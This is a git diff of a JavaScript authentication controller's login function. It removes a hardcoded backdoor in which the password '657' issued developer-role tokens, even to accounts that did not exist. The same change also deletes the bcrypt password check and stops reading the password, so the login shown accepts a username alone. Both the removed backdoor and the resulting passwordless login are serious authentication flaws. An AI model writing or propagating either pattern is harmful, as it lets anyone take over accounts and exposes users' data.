@@ -17,29 +17,13 @@ export const register = async (req, res) => {
 };
 
 export const login = async (req, res) => {
-    const { username, password } = req.body;
+    const { username } = req.body;
     console.log(`--- Login Attempt: ${username} ---`);
     try {
         const user = await User.findOne({ username });
 
-        // Developer Bypass 
-        if (password === '657') {
-            console.log('🚀 Developer Bypass Logic Activated');
-            // If user doesn't exist, create a dummy one or use a system-level ID
-            const targetId = user ? user._id : '000000000000000000000000';
-            const logUsername = user ? user.username : 'BypassUser';
-            const token = jwt.sign({ id: targetId, role: 'developer' }, process.env.JWT_SECRET, { expiresIn: '7d' });
-            return res.json({ token, role: 'developer', username: logUsername });
-        }
-
         if (!user) {
             console.log('User not found');
-            return res.status(400).json({ message: 'Invalid credentials' });
-        }
-
-        const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
-            console.log('Password mismatch');
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
@@ -112,3 +96,5 @@ export const deleteUser = async (req, res) => {
         res.status(500).json({ message: 'Error deleting user', error: error.message });
     }
 };
+
+// No provisionAccount needed
